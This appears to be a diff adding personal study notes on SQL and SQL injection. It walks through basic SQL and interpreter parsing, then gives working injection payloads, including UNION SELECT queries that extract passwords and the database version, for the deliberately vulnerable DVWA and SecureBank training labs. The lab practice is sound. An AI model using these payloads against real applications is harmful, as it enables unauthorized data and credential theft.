@@ -1,0 +1,112 @@
+SQL - Structured Query Language
+
+Database: added in order to protect data and to optimize typical operations done on data.
+
+With SQL you can interact with a Relational Database in order to:
+ - add new data
+ - delete old data
+ - modify existing data
+ - query data
+
+Relational Database -->
+ Tables that can be linked with eachothers through various constraints
+
+--------------------------
+
+SQL Commands
+
+CREATE TABLE users (
+  ID INT PRIMARY KEY NOT NULL,
+  NAME TEXT NOT NULL,
+  USERNAME TEXT NOT NULL,
+  EMAIL TEXT NOT NULL,
+  PASSWORD CHAR(32) NOT NULL  
+);
+
+INSERT INTO users VALUES
+(1, 'Leonardo', 'leo', 'leo@test.com', 'secret!'),
+(2, 'Test', 't', 'test@test.com', 'secret2!'),
+(3, 'Test', 't', 'test@test.com', 'secret2!');
+
+Some example of queries
+
+  SELECT * FROM users;
+  SELECT name,password FROM users;
+  SELECT name,password FROM users WHERE id=1;
+  SELECT name,password FROM users WHERE email='test@test.com';
+  SELECT id,name,password FROM users WHERE email='test@test.com';
+
+Typical SQL injection payload:
+
+  ' OR 1=1 -- 
+
+Because it allows to create queries like the following, which select
+all rows
+
+  SELECT name,password FROM users WHERE id=1 OR 1=1;
+
+NOTE: Be careful on using this in production system as the underlying
+database might have lots and lots of rows and retrieving all of them
+can be dangeorus for the availability aspect of the application under
+test.
+
+--------------------------
+
+How do interpreters work?
+
+- Application prepares TEXT to be processed by the interpreter
+
+- Attacker introduces malicious payload to TEXT
+
+- First they read some TEXT
+- Then they split the TEXT into TOKENS
+- Then TOKENS are combined into ABSTRACT SYNTAX TREES (ASTs)
+- Then we transform ASTs into different ASTS for many reasons
+- Execute the ASTs
+
+--------------------------
+
+To start DVWA
+
+  docker run --name dvwa --rm -d -it -p80:80 vulnerables/web-dvwa
+
+For more info
+ 
+  https://github.com/LeonardoE95/DVWA
+  
+----
+
+DVWA example: low
+
+Basic payload
+
+ ' OR 1=1 #
+
+To extract passwords
+
+ ' UNION SELECT user, password FROM users #
+
+----
+
+DVWA example: medium
+
+Basic payload
+
+ 1 OR 1=1 #
+
+To extract passwords
+
+ 1 UNION SELECT user, password FROM users #
+
+--------------------------
+
+To start SecureBank
+
+  docker run -d -p 80:80 -p 5000:5000 -p 1080:1080 -e 'SeedingSettings:Admin=admin@ssrd.io' -e 'SeedingSettings:AdminPassword=admin' ssrd/securebank
+
+
+SecureBank SQLi
+
+ ' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, 'string' FROM Transactions --
+
+ ' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, @@version FROM Transactions -- 
